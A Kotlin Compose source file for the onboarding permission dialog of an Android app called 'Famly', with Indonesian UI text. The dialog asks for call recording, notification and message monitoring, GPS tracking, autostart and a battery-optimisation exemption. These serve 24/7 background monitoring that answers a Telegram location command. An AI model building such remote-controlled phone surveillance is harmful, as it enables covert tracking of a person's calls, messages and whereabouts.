package com.example.ui.components

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import androidx.core.content.ContextCompat
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.BatteryFull
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.LocationOn
import androidx.compose.material.icons.filled.NotificationsActive
import androidx.compose.material.icons.filled.PowerSettingsNew
import androidx.compose.material.icons.filled.Shield
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import com.example.ui.theme.MinimalBorder
import com.example.ui.theme.MinimalCardBackground
import com.example.ui.theme.MinimalDarkBackground
import com.example.ui.theme.MinimalEmerald
import com.example.ui.theme.MinimalLavenderOnPrimary
import com.example.ui.theme.MinimalLavenderPrimary
import com.example.ui.theme.MinimalSurfaceElevated
import com.example.ui.theme.MinimalTextMuted
import com.example.ui.theme.MinimalTextPrimary
import com.example.ui.theme.MinimalTextSecondary
import com.example.utils.AutostartHelper

@Composable
fun OnboardingPermissionDialog(
    onRequestSystemPermissions: () -> Unit,
    onDismiss: () -> Unit
) {
    val context = LocalContext.current
    val scrollState = rememberScrollState()

    val isLocationGranted = ContextCompat.checkSelfPermission(
        context,
        Manifest.permission.ACCESS_FINE_LOCATION
    ) == PackageManager.PERMISSION_GRANTED

    val isNotificationListenerGranted = AutostartHelper.isNotificationListenerEnabled(context)
    val isBatteryOptimizationsIgnored = AutostartHelper.isIgnoringBatteryOptimizations(context)

    Dialog(
        onDismissRequest = onDismiss,
        properties = DialogProperties(
            dismissOnBackPress = true,
            dismissOnClickOutside = false,
            usePlatformDefaultWidth = false
        )
    ) {
        Surface(
            modifier = Modifier
                .fillMaxWidth(0.92f)
                .padding(vertical = 16.dp),
            shape = RoundedCornerShape(20.dp),
            color = MinimalDarkBackground,
            border = androidx.compose.foundation.BorderStroke(1.dp, MinimalBorder)
        ) {
            Column(
                modifier = Modifier
                    .padding(20.dp)
                    .verticalScroll(scrollState)
            ) {
                // Header
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Surface(
                        color = MinimalLavenderPrimary,
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier.size(44.dp)
                    ) {
                        Box(contentAlignment = Alignment.Center) {
                            Icon(
                                imageVector = Icons.Default.Shield,
                                contentDescription = null,
                                tint = MinimalLavenderOnPrimary,
                                modifier = Modifier.size(24.dp)
                            )
                        }
                    }
                    Spacer(modifier = Modifier.width(14.dp))
                    Column(modifier = Modifier.weight(1f)) {
                        Text(
                            text = "Konfigurasi Izin Famly",
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.Bold,
                            color = MinimalTextPrimary
                        )
                        Text(
                            text = "Akses Latar Belakang & Pemantauan 24/7",
                            style = MaterialTheme.typography.labelSmall,
                            color = MinimalLavenderPrimary
                        )
                    }
                }

                Spacer(modifier = Modifier.height(14.dp))

                Text(
                    text = "Agar aplikasi Famly dapat merekam notifikasi secara otomatis dan merespons perintah Telegram /lokasi saat HP di-lock, berikan semua izin di bawah ini:",
                    style = MaterialTheme.typography.bodySmall,
                    color = MinimalTextSecondary,
                    lineHeight = 18.sp
                )

                Spacer(modifier = Modifier.height(16.dp))

                // Item 1: System Runtime Permissions (Location, Telepon & Notifications)
                PermissionStepCard(
                    stepNumber = "1",
                    icon = Icons.Default.LocationOn,
                    title = "Izin GPS, Telepon & Notifikasi",
                    description = "Merekam panggilan masuk, panggilan keluar, dan melacak koordinat GPS secara akurat.",
                    isGranted = isLocationGranted,
                    buttonText = if (isLocationGranted) "Sudah Diizinkan" else "1. Izinkan GPS, Telepon & Notifikasi",
                    onClick = onRequestSystemPermissions
                )

                Spacer(modifier = Modifier.height(12.dp))

                // Item 2: Notification Listener
                PermissionStepCard(
                    stepNumber = "2",
                    icon = Icons.Default.NotificationsActive,
                    title = "Akses Listener Notifikasi",
                    description = "Diperlukan agar Famly dapat memantau pesan/notifikasi masuk dan menjalankan service Telegram 24/7.",
                    isGranted = isNotificationListenerGranted,
                    buttonText = if (isNotificationListenerGranted) "Akses Notifikasi Aktif" else "2. Aktifkan Akses Notifikasi",
                    onClick = {
                        AutostartHelper.openNotificationListenerSettings(context)
                    }
                )

                Spacer(modifier = Modifier.height(12.dp))

                // Item 3: Autostart (Mulai Otomatis)
                PermissionStepCard(
                    stepNumber = "3",
                    icon = Icons.Default.PowerSettingsNew,
                    title = "Mulai Otomatis (Autostart)",
                    description = "Penting untuk Xiaomi/Oppo/Vivo/Samsung agar service Famly langsung aktif setelah HP di-restart.",
                    isGranted = null, // Manual verification
                    buttonText = "3. Buka Pengaturan Mulai Otomatis",
                    onClick = {
                        AutostartHelper.openAutostartSettings(context)
                    }
                )

                Spacer(modifier = Modifier.height(12.dp))

                // Item 4: Battery Optimization
                PermissionStepCard(
                    stepNumber = "4",
                    icon = Icons.Default.BatteryFull,
                    title = "Matikan Penghemat Baterai",
                    description = "Pilih 'Tanpa Batasan' (Unrestricted) agar sistem Android tidak mematikan service di latar belakang.",
                    isGranted = isBatteryOptimizationsIgnored,
                    buttonText = if (isBatteryOptimizationsIgnored) "Penghemat Baterai Diabaikan" else "4. Matikan Penghemat Baterai",
                    onClick = {
                        AutostartHelper.requestDisableBatteryOptimization(context)
                    }
                )

                Spacer(modifier = Modifier.height(20.dp))

                // Footer Actions
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.End
                ) {
                    Button(
                        onClick = onDismiss,
                        colors = ButtonDefaults.buttonColors(
                            containerColor = MinimalLavenderPrimary,
                            contentColor = MinimalLavenderOnPrimary
                        ),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Icon(
                            imageVector = Icons.Default.CheckCircle,
                            contentDescription = null,
                            modifier = Modifier.size(18.dp)
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Saya Sudah Mengatur Semua / Lanjutkan", fontWeight = FontWeight.Bold, fontSize = 13.sp)
                    }
                }
            }
        }
    }
}

@Composable
private fun PermissionStepCard(
    stepNumber: String,
    icon: ImageVector,
    title: String,
    description: String,
    isGranted: Boolean?,
    buttonText: String,
    onClick: () -> Unit
) {
    Card(
        colors = CardDefaults.cardColors(containerColor = MinimalCardBackground),
        shape = RoundedCornerShape(12.dp),
        border = androidx.compose.foundation.BorderStroke(1.dp, if (isGranted == true) MinimalEmerald.copy(alpha = 0.5f) else MinimalBorder),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(modifier = Modifier.padding(14.dp)) {
            Row(
                verticalAlignment = Alignment.CenterVertically,
                modifier = Modifier.fillMaxWidth()
            ) {
                Surface(
                    color = if (isGranted == true) MinimalEmerald.copy(alpha = 0.2f) else MinimalSurfaceElevated,
                    shape = RoundedCornerShape(8.dp),
                    modifier = Modifier.size(32.dp)
                ) {
                    Box(contentAlignment = Alignment.Center) {
                        Icon(
                            imageVector = icon,
                            contentDescription = null,
                            tint = if (isGranted == true) MinimalEmerald else MinimalLavenderPrimary,
                            modifier = Modifier.size(18.dp)
                        )
                    }
                }

                Spacer(modifier = Modifier.width(10.dp))

                Text(
                    text = title,
                    style = MaterialTheme.typography.titleSmall,
                    fontWeight = FontWeight.Bold,
                    color = MinimalTextPrimary,
                    modifier = Modifier.weight(1f)
                )

                if (isGranted == true) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        modifier = Modifier
                            .background(MinimalEmerald.copy(alpha = 0.15f), RoundedCornerShape(6.dp))
                            .padding(horizontal = 8.dp, vertical = 4.dp)
                    ) {
                        Icon(
                            imageVector = Icons.Default.CheckCircle,
                            contentDescription = null,
                            tint = MinimalEmerald,
                            modifier = Modifier.size(12.dp)
                        )
                        Spacer(modifier = Modifier.width(4.dp))
                        Text("Aktif", fontSize = 11.sp, color = MinimalEmerald, fontWeight = FontWeight.Bold)
                    }
                } else if (isGranted == false) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        modifier = Modifier
                            .background(Color(0xFFE53935).copy(alpha = 0.15f), RoundedCornerShape(6.dp))
                            .padding(horizontal = 8.dp, vertical = 4.dp)
                    ) {
                        Icon(
                            imageVector = Icons.Default.Warning,
                            contentDescription = null,
                            tint = Color(0xFFE53935),
                            modifier = Modifier.size(12.dp)
                        )
                        Spacer(modifier = Modifier.width(4.dp))
                        Text("Perlu Izin", fontSize = 11.sp, color = Color(0xFFE53935), fontWeight = FontWeight.Bold)
                    }
                }
            }

            Spacer(modifier = Modifier.height(8.dp))

            Text(
                text = description,
                style = MaterialTheme.typography.bodySmall,
                color = MinimalTextMuted,
                fontSize = 11.sp,
                lineHeight = 15.sp
            )

            Spacer(modifier = Modifier.height(10.dp))

            OutlinedButton(
                onClick = onClick,
                shape = RoundedCornerShape(8.dp),
                modifier = Modifier.fillMaxWidth(),
                colors = ButtonDefaults.outlinedButtonColors(
                    contentColor = if (isGranted == true) MinimalEmerald else MinimalLavenderPrimary
                ),
                border = androidx.compose.foundation.BorderStroke(1.dp, if (isGranted == true) MinimalEmerald.copy(alpha = 0.5f) else MinimalLavenderPrimary)
            ) {
                Text(
                    text = buttonText,
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Medium
                )
            }
        }
    }
}
